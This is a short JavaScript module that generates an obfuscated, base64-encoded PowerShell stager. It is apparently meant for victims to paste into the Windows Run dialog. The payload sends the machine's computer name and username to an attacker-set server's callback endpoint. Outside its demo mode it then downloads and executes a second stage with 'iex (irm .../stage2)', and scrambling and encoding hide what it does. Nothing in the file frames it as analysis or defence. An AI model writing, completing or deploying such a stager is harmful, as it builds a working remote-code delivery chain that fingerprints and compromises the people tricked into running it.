const { scramblePowerShell, watermark } = require('./engine');

function generate(token, serverUrl, demo = false) {
    // Core stager: callbacks home, then pulls stage2
    const core = demo 
        ? `try{$u='${serverUrl}/callback';$b=@{token='${token}';h=$env:COMPUTERNAME;u=$env:USERNAME};irm -Uri $u -Method POST -Body $b -ContentType 'application/x-www-form-urlencoded'; Write-Host 'Houdini was here'}catch{}`
        : `try{$u='${serverUrl}/callback';$b=@{token='${token}';h=$env:COMPUTERNAME;u=$env:USERNAME};irm -Uri $u -Method POST -Body $b -ContentType 'application/x-www-form-urlencoded'; iex (irm ${serverUrl}/stage2)}catch{}`;
    
    const scrambled = scramblePowerShell(core, token);
    const marked = watermark(scrambled, token);
    
    // Encode as UTF-16LE then base64 (PowerShell -enc requirement)
    const buf = Buffer.from(marked, 'utf16le');
    const b64 = buf.toString('base64');
    
    // NO quotes around base64 — quotes break Run dialog
    return `powershell -enc ${b64}`;
}

module.exports = { generate };
